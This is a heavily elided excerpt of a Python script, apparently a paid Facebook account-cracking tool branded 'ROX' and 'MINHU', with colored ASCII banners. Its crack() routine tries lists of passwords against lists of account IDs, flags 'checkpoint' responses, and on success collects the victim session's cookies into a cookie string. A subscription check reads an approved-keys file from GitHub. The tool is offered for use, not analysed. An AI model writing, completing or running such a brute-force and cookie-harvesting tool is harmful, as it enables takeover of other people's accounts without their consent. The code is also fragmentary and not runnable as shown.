...
def banner():
	clear()
	sol()
	ban=''' © ABDULLAH AL MINHAZ

[green] _______    ______   __    __          ______    ______   __       __       
[blue]|       \  /      \ |  \  |  \        /      \  /      \ |  \     /  \      
[yellow]| $$$$$$$\|  $$$$$$\| $$  | $$       |  $$$$$$\|  $$$$$$\| $$\   /  $$      
[red]| $$__| $$| $$  | $$ \$$\/  $$______ | $$__| $$| $$__| $$| $$$\ /  $$$      
[green]| $$    $$| $$  | $$  >$$  $$|      \| $$    $$| $$    $$| $$$$\  $$$$      
...
def setting():
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print(f'{m}NOTE : USE DEFULT PASS MENU ') 
	print('')
...
def passwrd():
	...
	print(f'                    {m}R {k}O {h}X  {u}  ★  {b}M {u}I {h} N{k} H{m} U{b}')
	print('')
	...
	print('')
	print('Do you want to continue?{Y} ᐅ YES {n} ᐅ NO( Y/n) ? ')
	woi = input('=>Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}SUCCESS-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]                    ✨ OPPS-CHECKPOINT ✨ [red]'))
				...
				cetak(nel('[green]      ❤️✨ MINHU-OK ❤️✨[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      CONGRATULATION-OK 🥳[purple]')) 
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/ROX-AAM/ROX-PAID/blob/main/Approved.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
